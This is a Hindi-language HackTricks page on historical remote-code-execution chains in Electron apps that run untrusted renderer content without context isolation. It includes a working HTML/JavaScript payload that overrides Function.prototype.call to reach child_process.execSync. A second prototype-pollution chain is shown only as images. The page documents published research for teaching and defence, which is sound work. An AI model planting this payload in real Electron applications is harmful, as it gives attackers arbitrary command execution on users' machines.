# Electron context-isolation RCE via internal code

{{#include ../../banners/hacktricks-training.md}}

ये Electron applications के लिए **ऐतिहासिक exploitation patterns** हैं, जिनमें context isolation के बिना untrusted renderer content चलता था। Electron 12 से context isolation डिफ़ॉल्ट रूप से enabled है और इसे अब भी recommended security setting माना जाता है।<sup>[[1]](#references)</sup> Electron और Node.js के versions के अनुसार exact internals अलग-अलग होते हैं, इसलिए target application के bundled versions के विरुद्ध chain को दोबारा reproduce करें।

## उदाहरण 1: `Function.prototype.call` को override करना

यह उदाहरण Masato Kinugawa की CureCon presentation से है।<sup>[[2]](#references)</sup>

प्रभावित ऐतिहासिक Electron build में, internal ASAR code ने process का `exit` listener register किया था। Context isolation disabled होने पर page code और Electron के internal code ने JavaScript prototypes साझा किए, इसलिए renderer code internal listener के चलने से पहले `Function.prototype.call` को replace कर सकता था।<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![contextIsolation RCE उदाहरण में इस्तेमाल किया गया Electron asar.js आंतरिक code path](<../../images/image (1070).png>)

Listener को Node.js के event machinery के ज़रिए dispatch किया गया था। मूल पेज में एक पुराना `bin/events.js` path लिंक किया गया था; उसी ऐतिहासिक commit का वास्तविक source `lib/events.js` में है।<sup>[[5]](#references)</sup>

![Electron contextIsolation RCE chain द्वारा पहुँचा गया Node events.js code path](<../../images/image (793).png>)

इस path में, `self` Node.js का process object है:

![Electron internal code के ज़रिए Electron contextIsolation RCE - उदाहरण 1: जहाँ "self" Node का process object है](<../../images/image (700).png>)

ऐतिहासिक process object में `require` तक पहुँचने का एक path उपलब्ध था:

```
process.mainModule.require
```

क्योंकि listener dispatcher ने handler को process object के साथ invoke किया, इसलिए `call` को override करके उस object को recover किया जा सकता था और native command execute किया जा सकता था:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## उदाहरण 2: prototype pollution

ElectroVolt प्रस्तुति एक और ऐतिहासिक chain दिखाती है, जिसमें prototype pollution के ज़रिए `require` object हासिल किया जाता है।<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electron दस्तावेज़ीकरण - Context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Context isolation की कमी का दुरुपयोग - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Electron का ऐतिहासिक source - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Electron पर नए attack surface का पता लगाते हुए लोकप्रिय desktop apps को Pwning करना](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Node.js का ऐतिहासिक source - `lib/events.js` में listener dispatch](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
